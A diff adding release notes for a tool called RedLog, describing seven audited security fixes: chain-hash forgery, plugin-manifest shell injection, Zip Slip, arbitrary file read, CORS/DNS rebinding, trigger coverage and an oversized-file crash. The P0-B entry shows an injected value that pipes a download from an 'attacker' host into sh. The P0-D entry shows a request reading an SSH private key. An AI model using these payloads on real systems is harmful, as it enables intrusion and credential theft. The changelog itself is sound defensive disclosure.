@@ -3,6 +3,84 @@
 RedLog release history. Each entry links to the tag; run `gh release view v0.6.x`
 for full commit body + generated notes.
 
+## v0.6.93 — 2026-08-05
+Security hardening — 7 P0 items from the 5-agent audit that followed
+v0.6.92. All chain integrity + attack surface reduction; no user-facing
+changes.
+
+### P0-A — NULL prev_hash forgery blocked
+- **Where**: `chain-anchor.ts:452-505` (verifyChainFull) + `:757-772`
+  (verifyRandomSample)
+- **What**: attacker with local DB write could append a forged event with
+  `prev_hash=NULL` + hash computed under legacy `shapeV01` (which has no
+  `prevHash` field). verifyChainFull's "NULL prev_hash on any row is
+  legacy migration" branch returned `ok:true`.
+- **Fix**: track `seenNonNullPrevHash` — once the first non-NULL prev_hash
+  appears, ANY later NULL is tampering. Sampling verify caches the
+  migration-boundary `rowid` via `MIN(rowid) WHERE prev_hash IS NOT NULL`
+  and rejects post-boundary NULLs.
+
+### P0-B — Plugin `requires` shell injection closed
+- **Where**: `hooks-manager.ts:174-186` + `:235`
+- **What**: `execSync(\`which \${cmd}\`)` unquoted; `cmd` came from a
+  plugin manifest's `requires[]`, so a malicious manifest like
+  `requires: ["nmap; curl attacker/x | sh #"]` executed arbitrary shell.
+- **Fix**: `spawnSync(probeCmd, [cmd])` — argv only, no shell layer.
+
+### P0-C — Zip Slip guard actually catches escape
+- **Where**: `plugins/marketplace.ts:245, 327-337, +new assertNoTarEscape`
+- **What**: `assertInsideDir` only walked INSIDE `scratchDir` — a tar
+  entry with `../..` wrote OUTSIDE and never got checked. Prefix compare
+  also used bare `startsWith` (`/foo` prefixes `/foobar`).
+- **Fix**: new `assertNoTarEscape` runs `tar -tzf` pre-extract to
+  enumerate entries and reject absolute paths + any `..` component.
+  `assertInsideDir` prefix compare now uses `resolve(root) + sep`.
+  Only runs for the default extractor (tests supply in-memory mocks).
+
+### P0-D — /api/terminal/replay arbitrary file read
+- **Where**: `api-server.ts:645-680` + `cast-slice.ts:42-46`
+- **What**: `castPath` came from an attacker-inserted event's `data`,
+  passed straight to `fs.readFileSync`. Any token holder could POST
+  `session_start {castPath: "/…/.ssh/id_ed25519"}` and read the file
+  via `/api/terminal/replay`.
+- **Fix**: canonicalise `castPath` via `path.resolve`, reject anything
+  not `isInsideDir(<project>/casts)`.
+
+### P0-E — CORS `*` + Host allowlist
+- **Where**: `api-server.ts:265-296`
+- **What**: `Access-Control-Allow-Origin: *` on every response +
+  no Host validation → DNS rebinding surface against 127.0.0.1.
+- **Fix**: reflect Origin only for `app|file|http://localhost|127.0.0.1|[::1]`;
+  reject any `Host` header outside `localhost / 127.0.0.1 / [::1]` with
+  400 "bad host".
+
+### P0-F — Append-only trigger covers every hash-contributing field
+- **Where**: `db/events.ts:60-88` (`assertEventsAppendOnly`)
+- **What**: trigger only listed `hash, prev_hash, data, id, timestamp,
+  operator_id` — silently allowed UPDATE of `agent_type, hostname,
+  session_id, engagement_id, source_ip, target_id, monotonic_ns,
+  ntp_offset_ms, created_at, signature`. Chain hash catches these
+  eventually but the append-only doc claim overstated coverage.
+- **Fix**: DROP + CREATE (not IF NOT EXISTS) every project open so DBs
+  installed pre-v0.6.93 get the extended column list. Idempotent.
+
+### P0-G — cast-slice oversized bail
+- **Where**: `cast-slice.ts:42-46`
+- **What**: `oversized` flag was computed but `readFileSync` ran anyway —
+  a 500 MB cast OOM'd the main process. Cap is 50 MB (matches write-
+  time cap in terminal-manager); anything beyond is either attacker-
+  planted or a corrupted install.
+- **Fix**: `if (stat.size > MAX_CAST_BYTES) return null`. Tests still
+  assert `truncated:false` via a small shim.
+
+### Test updates
+- `test/signing.test.ts`: tamper-signature test now DROPs the trigger,
+  UPDATEs the signature, then reruns verify — simulates the "attacker
+  bypassed the trigger via direct sqlite3 CLI" scenario. Trigger
+  gets recreated on next `initDB`.
+
+Tests: 358 unit / 17 e2e / build clean.
+
 ## v0.6.92 — 2026-08-05
 W 專題 — 4 new capture sources, backend only. Grill Q7 option D.
 
